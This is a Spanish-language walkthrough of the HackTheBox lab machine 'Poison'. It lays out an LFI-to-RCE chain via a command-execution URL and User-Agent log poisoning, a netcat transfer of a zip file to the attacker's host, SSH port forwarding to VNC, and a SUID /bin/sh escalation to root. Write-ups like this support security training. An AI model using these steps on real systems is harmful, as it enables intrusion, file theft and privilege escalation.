---
title: HackTheBox - Poison
author: cotes
date: 2023-09-19 17:51:00 +0800
categories: [Writeup, HackTheBox, Medium]
tags: [Linux, 'LFI to RCE', 'Log Poisoning', 'Local Port Forwarding', ]
math: true
mermaid: true
image:
  path: /assets/images/HTB/Medium/Poison/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Poison Machine Logo
---

Máquina Linux de nivel **Medium** de HackThBox.

Técnicas usadas: **LFI to RCE, Log Poisoning, Local Port Forwarding**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Medium/Poison/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Medium/Poison/02-versions.png)

c. La página web nos dice que podemos ejecutar scripts **.php**, pero, el campo al no estar sanitizado correctamente, nos permite acceder incluir cualquier fichero

![](/assets/images/HTB/Medium/Poison/03-passwd.png)

* Lograremos una ejecución de comandos al leer el fichero de logs

![](/assets/images/HTB/Medium/Poison/04-log.png)

> La información que podemos manipular es el 'User-Agent', aquí es donde colocaremos nuestro código php para ser interpretado mediante el LFI
{: .prompt-info }

![](/assets/images/HTB/Medium/Poison/05-headers.png)

* En este caso la ruta para acceder a los logs en FreeBSD es `/var/log/httpd-access.log`, y ahora, ya podremos ejecutar comandos visitando la url: `http://<IP Poison>/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&cmd=[Comando]`

    ![](/assets/images/HTB/Medium/Poison/06-ls.png)

    * El fichero que nos llama la atención es **pwdbackup.txt**. El contenido de este está encodeado en base64 13 veces.

d. Obtendremos una contraseña 'Charix!2#4%6&8(0', la cual nos servirá para conectarnos en ssh con el usuario charix (Lo vimos al obtener el /etc/passwd)

### Escalada de Privilegios 💹

a. Al investigar en la máquina veremos dos cosas interesantes:

* Tenemos un fichero 'secret.zip' el cual nos transferimos a nuestra máquina

    ```bash
    ❯ nc -lvnp 443 > secret.zip
    -----------------------------------------------------
    charix@Poison:~ % nc -N 10.10.14.18 443 < secret.zip
    ```

* Tenemos 2 puertos abiertos internamente '5901 y 5801'

```bash
charix@Poison:~ % netstat -na -p tcp
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
<SNIP>
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

* Al consultar sobre estos puertos, en [HackTrick](https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc) nos mencionan que son del servicio VNC

b. Para auditar el servicio **VNC** nos piden una credencial alojada en un fichero, por lo que, descomprimimos el .zip usando la contraseña del usuario charix

```bash
❯ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: Charix!2#4%6&8(0
extracting: secret
```

* Además, como el puerto 5901 no es accesible desde fuera, haremos Local Port Forwarding con SSH

    ```bash
    ❯ ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
    ------------------------------------------------
    ❯ lsof -i:5901
    ssh     54634 root    5u  IPv4 153287      0t0  TCP localhost:5901 (LISTEN)
    ```

c. Ahora, ya podemos acceder a este servicio. Al ser **root** le damos permiso SUID a la /bin/sh

```bash
❯ vncviewer -passwd secret 127.0.0.1::5901
```

![](/assets/images/HTB/Medium/Poison/07-root.png)

* Ahora desde ssh podemos acceder a una `/bin/sh` como root

    ```bash
    charix@Poison:~ % sh -p
    # whoami
    root
    ```